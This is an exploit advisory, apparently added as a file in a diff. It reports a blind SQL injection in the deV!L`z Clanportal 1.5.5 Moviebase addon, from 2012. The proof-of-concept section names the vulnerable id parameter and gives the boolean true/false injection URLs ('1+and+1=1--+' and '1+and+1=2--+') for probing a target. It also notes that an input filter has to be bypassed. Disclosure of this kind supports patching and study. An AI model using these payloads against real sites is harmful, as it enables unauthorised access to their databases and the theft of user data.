@@ -1,0 +1,28 @@
+========================================================================================                 
+| # Title    : deV!L`z Clanportal 1.5.5 Moviebase Addon Blind SQL Injection Vulnerability         
+| # Author   : Easy Laster                                                                               
+| # Download : http://www.modsbar.de/Addons/79/moviebase/
+| # Script   : deV!L`z Clanportal 1.5.5 Moviebase     
+| # Price    : 20?
+| # Bug      : Blind SQL Injection   
+| # Date     : 12.01.2012
+| # Language : PHP
+| # Status   : vulnerable/Non-Public
+| # Greetings: secunet.to ,4004-security-project, Team-Internet, HANN!BAL, RBK, Dr.Ogen, ezah                                                               
+======================        Proof of Concept         =================================
+[+] Vulnerability
+
+    movies/index.php?action=showkat&id=
+
+[+] Injectable
+
+    #true
+
+    http://[host]/[path]/movies/index.php?action=showkat&id=1+and+1=1--+
+
+
+    #false   
+
+    http://[host]/[path]/movies/index.php?action=showkat&id=1+and+1=2--+
+
+[-] The SQL Injection Filter Function must be bypassed  ()   
